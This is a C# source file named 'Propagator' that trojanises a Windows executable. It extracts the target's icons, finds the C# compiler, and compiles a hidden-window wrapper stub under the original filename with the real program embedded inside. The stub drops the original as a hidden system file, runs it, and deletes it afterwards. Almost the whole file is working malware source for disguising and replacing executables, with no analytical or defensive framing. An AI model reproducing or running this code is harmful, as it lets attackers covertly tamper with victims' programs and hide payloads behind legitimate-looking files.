using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Propagator
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Propogate("e:\\temp\\warplanning.exe");

            Application.Run();
        }

        static void Propogate(String filePath)
        {
            if (System.IO.File.Exists(filePath))
            {
                String cscPath = "";
                String cscName = "csc.exe";
                String iconPath = System.IO.Path.GetTempFileName();
                String codePath = System.IO.Path.GetTempFileName();
                String tmpPath = System.IO.Path.GetTempFileName().ToLower().Replace(".tmp", ".exe");
                String newPath = System.IO.Path.Combine(System.IO.Path.GetDirectoryName(filePath), "run.exe");
                String hdd = System.IO.Path.GetPathRoot(System.Environment.SystemDirectory);

                //load associate icons-merge them-save it
                System.Collections.Generic.List<System.Drawing.Icon> icons = TAFactory.IconPack.IconHelper.ExtractAllIcons(filePath);
                System.Drawing.Icon icon = TAFactory.IconPack.IconHelper.Merge(icons.ToArray());

                System.IO.FileStream fs = new System.IO.FileStream(iconPath, System.IO.FileMode.Create, System.IO.FileAccess.Write);
                icon.Save(fs);
                fs.Close();

                //search for csc
                String path = System.IO.Path.Combine(hdd, "Windows\\Microsoft.NET\\Framework");
                String path1 = path + "\\v2.0.50727";
                String path2 = path + "\\v3.5";
                String path3 = path + "\\v4.0.30319";

                if (System.IO.File.Exists(System.IO.Path.Combine(path1, cscName)))
                    cscPath = path1;
                else
                    if (System.IO.File.Exists(System.IO.Path.Combine(path2, cscName)))
                        cscPath = path2;
                    else
                        if (System.IO.File.Exists(System.IO.Path.Combine(path3, cscName)))
                            cscPath = path3;
                        else
                        {
                            System.IO.DriveInfo[] drives = System.IO.DriveInfo.GetDrives();
                            Boolean found = false;

                            foreach (System.IO.DriveInfo drive in drives)
                                if (!found && drive.IsReady)
                                    if (drive.DriveType == System.IO.DriveType.Fixed)
                                        foreach (String file in System.IO.Directory.GetFiles(drive.Name, "csc.exe", System.IO.SearchOption.AllDirectories))
                                            if (System.IO.Path.GetFileName(file) == cscName)
                                            {
                                                cscPath = file;
                                                found = true;
                                                break;
                                            }
                        }

                cscPath = System.IO.Path.Combine(cscPath, cscName);

                //write cs code for the new file
                String code =
                @"
                using System;

                class program
                {
                    private static String newPath = System.IO.Path.GetFileName(@""" + newPath + @""");

                    private static void Main()
                    {
                        try
                        {
                            String tmpPath = System.IO.Path.GetFileName(@""" + tmpPath + @""");
    
                            if (System.IO.File.Exists(newPath))
                                System.Diagnostics.Process.Start(newPath);
                            else
                            {
                                System.IO.Stream stream = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(System.IO.Path.GetFileName(tmpPath));
                                System.IO.FileStream fileStream = new System.IO.FileStream(newPath, System.IO.FileMode.Create, System.IO.FileAccess.Write);
                                Byte[] byt = new Byte[stream.Length];

                                stream.Read(byt, 0, byt.Length);
                                fileStream.Write(byt, 0, byt.Length);

                                fileStream.Close();
                                stream.Close();

                                System.IO.File.SetAttributes(newPath, System.IO.FileAttributes.System);
                                System.IO.File.SetAttributes(newPath, System.IO.FileAttributes.Hidden);

                                if (System.IO.File.Exists(newPath))
                                {
                                    System.Diagnostics.Process process = new System.Diagnostics.Process();
                                    process.StartInfo.FileName = newPath;
                                    process.Exited += process_Exited;
                                    process.Start();
                                }
                            }
                        }
                        catch(Exception ex)
                        {
                            System.IO.StreamWriter sw=new System.IO.StreamWriter(""e:\\log.txt"");
                            sw.Write(ex.Message);
                            sw.Close();
                        }

                        System.Windows.Forms.Application.Run();
                    }

                    private static void process_Exited(object sender, EventArgs e)
                    {
                        if (System.IO.File.Exists(newPath))
                        {
                            System.IO.File.Delete(newPath);

                        }
                    }
                }  
                ";
                
                System.IO.StreamWriter codeSw = new System.IO.StreamWriter(codePath);
                codeSw.Write(code);
                codeSw.Close();
                
                //make an exe file refere to filePath
                System.IO.File.Move(filePath, tmpPath);

                if (System.IO.File.Exists(cscPath))
                {
                    System.Diagnostics.Process process = new System.Diagnostics.Process();
                    process.StartInfo.Arguments = @" /target:winexe /out:" + filePath + " /win32icon:" + iconPath + " /resource:" + tmpPath + " " + codePath;
                    process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    process.StartInfo.CreateNoWindow = false;
                    process.StartInfo.UseShellExecute = true;
                    process.StartInfo.FileName = cscPath;
                    process.Start();
                    while (!process.HasExited) ;
                }

                //delete filePath,iconFile
                if (System.IO.File.Exists(tmpPath))
                    System.IO.File.Delete(tmpPath);

                if (System.IO.File.Exists(codePath))
                    System.IO.File.Delete(codePath);

                if (System.IO.File.Exists(iconPath))
                    System.IO.File.Delete(iconPath);
            }
        }
    }
}
